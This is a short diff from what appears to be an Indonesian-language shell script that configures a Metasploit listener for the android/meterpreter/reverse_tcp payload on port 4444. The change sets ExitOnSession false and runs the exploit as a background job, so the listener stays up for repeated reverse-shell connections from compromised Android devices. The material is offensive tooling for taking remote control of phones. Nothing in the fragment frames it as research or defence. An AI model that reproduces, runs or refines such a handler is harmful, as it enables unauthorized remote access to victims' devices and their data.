@@ -165,7 +165,8 @@ if [ $start = "y" ]; then
                 set payload android/meterpreter/reverse_tcp;
                 set lhost 0.0.0.0;
                 set lport 4444;
-                exploit"
+                set ExitOnSession false;
+                exploit -j"
             else
                 echo "Kesalahan"
             fi
